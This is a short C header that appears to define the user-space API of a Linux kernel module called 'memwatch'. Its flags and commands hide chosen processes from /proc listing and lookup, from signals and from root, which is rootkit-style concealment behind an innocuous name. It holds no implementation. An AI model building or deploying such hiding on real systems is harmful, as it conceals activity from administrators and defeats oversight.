#ifndef MEMWATCH_UAPI_H
#define MEMWATCH_UAPI_H

#include <linux/types.h>

#define MW_BOOTSTRAP 0x4d570001U
#define MW_BOOTSTRAP_MAGIC 0x4d4d4d4dU
#define MW_ABI_VERSION 1

#define MW_MAX_HIDDEN 16

/* Feature flags (MW_HIDE_ENABLE) */
#define MW_F_PROC_LIST   (1U << 0)  /* filter /proc enumeration */
#define MW_F_PROC_LOOKUP (1U << 1)  /* block direct /proc/<pid> access */
#define MW_F_SIGNAL      (1U << 2)  /* signals to hidden pids silently succeed */
#define MW_F_HIDE_ROOT   (1U << 3)  /* also hide from root readers */

#define MW_HIDE_ADD    641
#define MW_HIDE_REMOVE 642
#define MW_HIDE_CLEAR  643
#define MW_HIDE_ENABLE 644
#define MW_HIDE_QUERY  645

struct mw_bootstrap {
	__u32 magic;
	__s32 fd;
};

struct mw_pid {
	__s32 pid;  /* 0 = caller's thread group */
};

struct mw_enable {
	__u32 enable;
	__u32 flags;
};

struct mw_state {
	__u32 enabled;
	__u32 flags;
	__u32 count;
	__u32 reserved;
	__s32 pids[MW_MAX_HIDDEN];
};

#endif
